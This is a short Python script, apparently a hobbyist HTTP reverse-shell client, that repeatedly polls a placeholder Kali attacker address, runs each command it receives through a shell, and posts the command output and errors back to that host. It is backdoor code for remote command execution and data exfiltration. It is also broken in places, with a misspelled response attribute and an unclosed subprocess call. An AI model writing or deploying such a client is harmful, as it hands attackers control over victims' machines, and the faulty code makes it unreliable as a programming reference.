#basic httpd client
import requests
import subprocess
import time


print 'welcome to my client'
print '<====================================>'
print 'THE TOOLS USE FOR CLIENT EXECUTE'
print '<====================================>'


while True:

	req = requests.get('http://ip for kali') # kirim telah mendapatkan request dari server
	command = req.txt

	if 'terminate' in command:
		break

	else:
		CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr= subprocess
		post_response = requests.post(url='http://ip for kali', data=CMD.stdout.read())
		post_response = requests.post(url='http:// ip for kali', data=CMD.stderr.read())

	time.sleep(3)